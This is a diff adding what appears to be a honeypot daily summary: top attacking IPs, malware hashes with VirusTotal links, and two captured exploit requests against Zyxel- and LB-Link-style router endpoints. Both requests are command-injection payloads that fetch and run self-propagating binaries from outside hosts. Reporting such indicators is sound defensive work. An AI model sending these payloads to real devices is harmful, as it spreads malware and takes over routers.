@@ -1,0 +1,24 @@
+Top 5 IPs for 2024-02-10:
+
+1.34.244.227
+42.179.153.149
+222.241.50.168
+58.47.42.202
+175.31.200.71
+
+Malware download: 
+1f4a839209cf62f50ffd2960cdebda68bbfe405055881daf5ac19248cc4e7c9f
+https://www.virustotal.com/gui/file/1f4a839209cf62f50ffd2960cdebda68bbfe405055881daf5ac19248cc4e7c9f
+1cee8d8c999f5882e2d3f3da3ae3ebe9ef3435aa8b7f7d5c69bc068178055bda
+https://www.virustotal.com/gui/file/1cee8d8c999f5882e2d3f3da3ae3ebe9ef3435aa8b7f7d5c69bc068178055bda
+bb082371dda8263a989d33811f6ee1e89a19183015307c7c16f198fe4bea95dd
+https://www.virustotal.com/gui/file/bb082371dda8263a989d33811f6ee1e89a19183015307c7c16f198fe4bea95dd
+
+Malcious Commands seen:
+
+GET /bin/zhttpd/${IFS}cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}*mips*;${IFS}wget${IFS}http://103.180.149.156/huhu.mips;${IFS}chmod${IFS}777${IFS}huhu.mips;${IFS}./huhu.mips${IFS}zyxel.selfrep;
+
+POST /goform/set_LimitClient_cfg HTTP/1.1
+Cookie: user=admin
+
+time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf mpsl;wget http://103.180.149.62/skyljne.mpsl; chmod 777 skyljne.mpsl; ./skyljne.mpsl lblink.selfrep;
